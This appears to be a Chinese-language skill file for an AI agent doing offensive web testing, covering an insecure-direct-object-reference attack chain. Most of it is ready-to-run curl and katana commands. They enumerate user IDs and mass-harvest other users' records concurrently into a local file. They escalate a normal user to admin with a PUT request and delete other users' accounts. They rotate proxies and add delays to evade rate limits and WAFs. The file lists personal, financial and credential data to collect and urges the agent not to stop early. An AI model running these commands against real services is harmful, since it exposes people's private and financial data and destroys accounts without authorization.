---
name: idor-mass-harvest
description: IDOR detection and mass data harvesting through horizontal/vertical privilege escalation and batch enumeration
version: 1.0.0
---

# IDOR 批量收割

## 适用场景

发现疑似 IDOR (不安全的直接对象引用) 端点后加载。覆盖端点识别 → ID 范围探测 → 横向数据访问 → 纵向越权 → 批量遍历 → 影响量化 → 关键接口越权完整链。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 攻击链

### 1) IDOR 端点识别

```bash
# 通过 katana 爬取 + 分析含 ID 参数的端点
katana -u https://TARGET -jc -d 3 | grep -E '\?.*id=|/\d+(/|$)|/users?/|/order|/profile|/account|/invoice|/document'

# 代理版
katana -u https://TARGET -jc -d 3 -proxy http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000 | grep -E '\?.*id=|/\d+(/|$)|/users?/|/order|/profile|/account|/invoice|/document'

# 手工探测常见 IDOR 端点
for ep in "/api/user/1" "/api/order/1" "/api/profile/1" "/api/invoice/1" "/api/document/1" "/api/account/1"; do
  curl -sk "https://TARGET${ep}" -H "Authorization: Bearer USER_TOKEN" -o /dev/null -w "%{http_code} %{size_download} ${ep}\n"
done
```

### 2) ID 形态分析 + 范围探测

ID 类型判断:
- 自增整数: 1, 2, 3... → 可预测,批量遍历
- UUID: 550e8400-e29b... → 不可预测,需其他泄露点
- 编码 ID: base64 / hex → 解码后判断
- 时间戳 ID: 可预测,按时间范围遍历
- 短 hash: 可能有限空间,可穷举

```bash
# 探测 ID 范围 (自增型)
for id in 1 2 3 100 1000 10000 99999; do
  curl -sk "https://TARGET/api/user/${id}" -H "Authorization: Bearer USER_TOKEN" -o /dev/null -w "%{http_code} %{size_download} id=${id}\n"
done
```

### 3) 横向越权验证

```bash
# 用 A 用户 Token 访问 B 用户数据
curl -sk "https://TARGET/api/user/OTHER_USER_ID" -H "Authorization: Bearer USER_A_TOKEN"

# 对比自身数据和他人数据
curl -sk "https://TARGET/api/user/MY_ID" -H "Authorization: Bearer MY_TOKEN" | md5sum
curl -sk "https://TARGET/api/user/OTHER_ID" -H "Authorization: Bearer MY_TOKEN" | md5sum
```

### 4) 纵向越权验证

```bash
# 普通用户访问管理员接口
curl -sk "https://TARGET/api/admin/users" -H "Authorization: Bearer NORMAL_USER_TOKEN"
curl -sk "https://TARGET/api/admin/config" -H "Authorization: Bearer NORMAL_USER_TOKEN"
curl -sk "https://TARGET/api/admin/logs" -H "Authorization: Bearer NORMAL_USER_TOKEN"

# 修改操作 (PUT/DELETE)
curl -sk -X PUT "https://TARGET/api/user/ADMIN_ID" -H "Authorization: Bearer NORMAL_USER_TOKEN" -H "Content-Type: application/json" -d '{"role":"admin"}'
curl -sk -X DELETE "https://TARGET/api/user/OTHER_ID" -H "Authorization: Bearer NORMAL_USER_TOKEN"
```

### 5) 批量遍历

```bash
# 批量数据收割 (50-200 并发)
for id in $(seq 1 500); do
  curl -sk "https://TARGET/api/user/${id}" -H "Authorization: Bearer TOKEN" >> /tmp/idor_harvest.json &
  [ $((id % 50)) -eq 0 ] && wait
done
wait

# 代理版 (WAF 场景)
for id in $(seq 1 500); do
  curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/api/user/${id}" -H "Authorization: Bearer TOKEN" >> /tmp/idor_harvest.json &
  [ $((id % 20)) -eq 0 ] && wait && sleep 1
done
wait

# 统计数据量
cat /tmp/idor_harvest.json | python3 -c "import sys,json; data=[json.loads(l) for l in sys.stdin if l.strip()]; print(f'Total records: {len(data)}')"
```

### 6) 影响量化

统计: 可访问用户总数 / 可提取数据类型 / 涉及敏感字段 / 影响人数估算

### 7) 关键接口越权

在 IDOR 基础上探测更高危操作:
- 密码重置接口 IDOR
- 支付/交易接口 IDOR
- 文件下载接口 IDOR
- 权限修改接口 IDOR

## WAF 对抗集成

IDOR 攻击通常不触发 WAF 规则 (请求格式合法),主要风险是频率限制:

```bash
# 降速 + 代理 (频率限制场景)
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/api/user/ID" -H "Authorization: Bearer TOKEN"

# 添加随机延时
sleep $((RANDOM % 3 + 1))
```

## 代理池启用判定

- 频率限制触发 (429 / 403) → 切代理 + 降速
- WAF 标记有 → 遍历阶段走代理
- 正常无限制 → 直连遍历最大化速度

## 敏感数据采集点

- 账户类: 用户名 / 邮箱 / 手机号 / 身份证号 / 地址
- 金融类: 订单 / 交易流水 / 银行卡号 / 余额
- 业务敏感: 员工信息 / 合同 / KYC 材料
- 凭据类: API Key / Token (若接口返回)

每项: 字段位置 / 数据量 / 样本 10-50 条 / 影响人数 / 危害等级

## 失败处理

1. ID 不可预测 (UUID) → 从其他泄露点获取 (API 列表接口 / 前端 JS / 搜索功能)
2. 频率限制 → 降速 + 切代理 + 分批
3. 权限检查严格 → 尝试不同 HTTP 方法 (GET/POST/PUT/PATCH) / 参数位置 (URL/body/header)
4. 返回 403 → 尝试 HTTP 方法覆盖 (X-HTTP-Method-Override / _method 参数)
5. 接口需要额外参数 → 从合法请求中提取补全

## 报告必填字段

- 漏洞标题 / 漏洞指纹
- 完整 PoC (含请求 + 响应)
- WAF 类型 + 绕过路径
- 越权类型 (横向 / 纵向)
- 可访问数据范围 + 总量
- 敏感数据清单 (分类 + 样本)
- 影响用户数估算
- 利用链上下文
- CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 是否同时测试了横向越权和纵向越权?
2. 是否进行了批量遍历并量化了影响范围?
3. 是否探测了关键接口 (密码重置 / 支付 / 权限修改) 的 IDOR?
